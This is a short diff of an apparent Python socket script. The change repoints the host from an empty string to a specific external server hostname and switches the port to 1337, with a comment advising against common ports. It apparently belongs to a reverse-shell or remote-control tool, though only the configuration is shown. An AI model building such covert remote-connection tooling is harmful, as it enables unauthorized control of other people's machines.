@@ -7,8 +7,8 @@ def create_socket():
                 global host
                 global port
                 global s
-                host = ''
-                port = 9999
+                host = 'vmi850151.contaboserver.net'
+                port = 1337
                 # don't use common ports like 80, 3389
 
                 s = socket.socket() # actual conversation between server and client
